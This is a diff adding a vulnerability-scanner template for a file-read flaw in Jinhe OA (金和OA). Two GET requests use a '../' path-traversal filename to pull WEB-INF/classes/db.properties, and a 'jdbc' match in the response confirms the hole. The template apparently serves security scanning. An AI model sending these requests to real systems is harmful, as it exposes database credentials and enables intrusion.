@@ -1,0 +1,16 @@
+name: 金和OA-oaplusrangedownloadfile-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties
+    expression:
+      status: 200
+      body_all: ["jdbc"]
+  - method: GET
+    path: /pm/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties
+    expression:
+      status: 200
+      body_all: ["jdbc"]
